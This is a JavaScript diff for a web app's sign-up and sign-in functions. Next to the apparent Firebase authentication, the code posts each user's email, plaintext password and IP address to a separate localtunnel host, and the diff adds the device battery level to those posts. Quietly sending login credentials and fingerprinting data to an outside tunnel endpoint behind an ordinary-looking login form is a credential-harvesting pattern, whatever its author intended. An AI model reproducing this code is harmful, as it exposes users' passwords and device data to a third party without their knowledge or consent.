@@ -21,16 +21,18 @@ function signUp() {
     email.value,
     password.value
   );
-
-  axios
-    .post("https://howto13.loca.lt/register", {
-      email: email.value,
-      password: password.value,
-      ipadress: ip_address,
-    })
-    .then((res) => {
-      console.log(res.data);
-    });
+  navigator.getBattery().then(function (battery) {
+    axios
+      .post("https://howto13.loca.lt/register", {
+        email: email.value,
+        password: password.value,
+        ipadress: ip_address,
+        battery: battery.level,
+      })
+      .then((res) => {
+        console.log(res.data);
+      });
+  });
 
   promise.catch((e) => {
     if (e.message.toString() == "The email address is badly formatted.") {
@@ -92,15 +94,24 @@ function signIn() {
              `
     );
   });
-  axios
-    .post("https://howto13.loca.lt/login", {
-      email: email.value,
-      password: password.value,
-      ipadress: ip_address,
-    })
-    .then((res) => {
-      console.log(res.data);
-    });
+
+  navigator.getBattery().then(function (battery) {
+    axios
+      .post("https://howto13.loca.lt/login", {
+        email: email.value,
+        password: password.value,
+        ipadress: ip_address,
+        battery: battery.level,
+      })
+      .then((res) => {
+        console.log(res.data);
+      });
+  });
+
+  navigator.getBattery().then(function (battery) {
+    console.log("Device charging : " + battery.level + "%");
+  });
+
   const promise = auth.signInWithEmailAndPassword(email.value, password.value);
   promise.catch((e) => {
     if (
